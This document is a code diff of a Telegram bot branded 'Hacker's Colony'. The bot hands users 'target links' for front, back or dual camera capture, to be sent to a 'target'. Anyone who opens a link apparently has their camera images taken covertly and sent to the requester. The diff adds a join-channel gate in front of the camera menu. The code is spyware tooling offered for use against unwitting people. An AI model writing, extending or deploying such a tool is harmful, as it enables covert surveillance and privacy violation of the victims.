@@ -5,7 +5,7 @@ from telebot import types
 app = Flask(__name__)
 
 BOT_TOKEN = os.getenv('BOT_TOKEN')
-ADMINS = [518067190, 7162565886] 
+TG_CHANNEL = "https://t.me/HackersColony"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -14,23 +14,29 @@ time.sleep(2)
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
-        types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"),
-        types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"),
-        types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"),
-        types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190")
+        types.InlineKeyboardButton("📢 Join Telegram 📢", url=TG_CHANNEL),
+        types.InlineKeyboardButton("✅ I Have Joined ✅", callback_data="check_join")
     )
-    bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>\nSelect your camera mode:", parse_mode='HTML', reply_markup=markup)
+    bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>", parse_mode='HTML', reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
-    if "m_" in call.data:
+    if call.data == "check_join":
+        markup = types.InlineKeyboardMarkup()
+        btn1 = types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front")
+        btn2 = types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back")
+        markup.row(btn1, btn2)
+        markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
+        markup.row(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
+        bot.edit_message_text("<b>Select your camera mode:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
+
+    elif "m_" in call.data:
         mode = call.data.replace("m_", "")
         target_link = f"https://{request.host}/?m={mode}&uid={call.message.chat.id}"
-        
         response_text = (
-            f"🤠 It's your target link 🔗 just send it your target 🎯\n\n"
+            f"🤠 It's your target link 🔗\n\n"
             f"Url = ( {target_link} )\n\n"
             f"✨ Thank you team HCO ✨"
         )
